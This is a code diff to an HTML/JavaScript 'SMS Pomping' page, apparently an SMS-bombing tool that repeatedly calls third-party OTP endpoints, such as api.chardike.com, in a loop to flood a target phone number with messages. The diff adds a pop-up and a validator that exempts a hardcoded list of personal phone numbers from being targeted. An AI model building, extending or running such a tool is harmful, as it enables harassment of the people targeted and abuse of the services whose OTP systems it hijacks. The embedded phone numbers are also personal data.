@@ -1,6 +1,17 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
+    <!-- <div id="error-image-container" style="display:none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1000; background-color: rgba(0, 0, 0, 0.8); padding: 20px; border-radius: 10px;">
+        <img id="error-image" src="" alt="Error" style="width: 200px;">
+    </div> -->
+
+    <!-- add a image at error-->
+    <div id="error-image-container" style="display:none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1000; background-color: rgba(0, 0, 0, 0.8); padding: 20px; border-radius: 10px; width: 50%; max-width: 90vw;">
+        <img id="error-image" src="" alt="Error" style="width: 100%; height: auto; border-radius: 10px;">
+        <button id="close-error-image" style="display:block; margin: 10px auto; padding: 5px 10px; background-color: #ff0000; color: #fff; border: none; border-radius: 5px; cursor: pointer;">Close</button>
+    </div>
+    
+
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>SMS Pomping</title>
@@ -25,6 +36,9 @@
     box-sizing: border-box;
     overflow-x: hidden;
 }
+
+
+
 
         .container {
             max-width: 690px;
@@ -1060,7 +1074,7 @@ async function api_24(phone) {
 }
 
 async function api_25(phone) {
-    const url = "https://api.chardike.com/api/otp/send"; // নতুন URL
+    const url = "https://api.chardike.com/api/otp/send"; //  URL
 
     try {
         const response = await fetch(url, {
@@ -1179,7 +1193,7 @@ async function startProcess() {
 
     if (Array.from(inputs).every(input => input.value.trim() !== '')) {
         if (!validateNumber(number)) {
-            showMessage('error', 'নাম্বার সঠিকভাবে পূরণ করুন।');
+            showMessage('error', 'Incorrect');
             return;
         }
 
@@ -1190,7 +1204,7 @@ async function startProcess() {
             let successCount = 0;
             let failureCount = 0;
 
-            // প্রতিটি রিকোয়েস্টকে unique ভাবে পাঠানো হচ্ছে
+         
             for (let i = 0; i < amount; i++) {
                 const availableApis = apis.filter(api => api.count < api.limit);
                 if (availableApis.length === 0) {
@@ -1201,14 +1215,13 @@ async function startProcess() {
                 const currentApi = availableApis[apiIndex];
 
                 try {
-                    // রিকোয়েস্ট পাঠানোর আগেই লিমিট চেক করা
+                    
                     if (currentApi.count >= currentApi.limit) {
                         throw new Error('API limit exceeded');
                     }
 
                     const response = await currentApi.func(number);
 
-                    // ব্যর্থতা চেক
                     if (!response || 
                         response.status === 'Failed' || 
                         response.status === 'failed' || 
@@ -1238,6 +1251,61 @@ async function startProcess() {
         showMessage('error', 'Wrong Information');
     }
 }
+
+// function validateNumber(number) {
+//     const phoneRegex = /^01\d{9}$/;
+    
+//     // List of numbers that should trigger an error
+//     const blockedNumbers = ['01636055047', '01741281208', '01716512308'];
+
+//     // Check if the number is in the blocked list
+//     if (blockedNumbers.includes(number)) {
+//         alert('Know your place peasant!!');
+//         return false;
+//     }
+    
+//     // Return true if the number passes the regex and is not blocked
+//     return phoneRegex.test(number);
+// }
+
+function validateNumber(number) {
+    const phoneRegex = /^01\d{9}$/;
+    
+    // List of numbers that should trigger an error
+    const blockedNumbers = ['01636055047', '01741281208', '01795773508','01569186126','017165123'];
+    
+    // Get the error image container and image elements
+    const errorImageContainer = document.getElementById('error-image-container');
+    const errorImage = document.getElementById('error-image');
+
+    // Function to show an image
+    function showErrorImage(imageSrc) {
+        errorImage.src = imageSrc; // Set the image source
+        errorImageContainer.style.display = 'block'; // Show the container (pop-up)
+    }
+
+    // Function to hide the image
+    function hideErrorImage() {
+        errorImageContainer.style.display = 'none'; // Hide the container
+    }
+
+    // Check if the number is in the blocked list
+    if (blockedNumbers.includes(number)) {
+        showErrorImage('blocked-number.png'); // Replace with your blocked image URL
+        return false;
+    }
+    
+    // Check if the number passes the regex validation
+    if (!phoneRegex.test(number)) {
+    
+        return false;
+    }
+
+    // If the number is valid and not blocked, hide the image
+    hideErrorImage();
+    return true;
+}
+
 
     </script>
 </body>
